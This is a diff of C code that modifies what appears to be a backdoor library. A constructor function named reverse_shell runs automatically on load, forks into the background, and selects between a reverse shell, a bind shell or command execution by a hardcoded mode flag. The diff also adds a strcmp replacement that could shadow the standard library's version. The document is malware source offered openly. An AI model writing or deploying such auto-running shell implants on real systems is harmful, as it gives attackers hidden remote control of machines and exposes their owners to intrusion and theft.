@@ -76,18 +76,31 @@ void cmd_execute() {
     }
 }
 
+int strcmp(const char *s1, const char *s2) {
+    for (int i = 0; s1[i] != '\0' || s2[i] != '\0'; i++)
+    {
+        if (s1[i] != s2[i])
+        {
+            return 1;
+        }
+    }
+    return 0;
+}
+
 __attribute__((constructor)) static void reverse_shell(void)
 {
     int pid = fork();
     if (pid > 0) {
+        // exit parent 
         return;
     }
-    pid = fork();
-    if (pid > 0) {
-        bind_shell();
-        return;
-    } else {
+    const char* MODE = "MODE_CHECK_FLAG";
+    if (strcmp(MODE, "MODE_REVERSE_SH") == 0) {
         rev_shell();
-        return;
+    } else 
+    if (strcmp(MODE, "MODE_BINDING_SH") == 0) {
+        bind_shell();
+    } else {
+        cmd_execute();
     }
 }
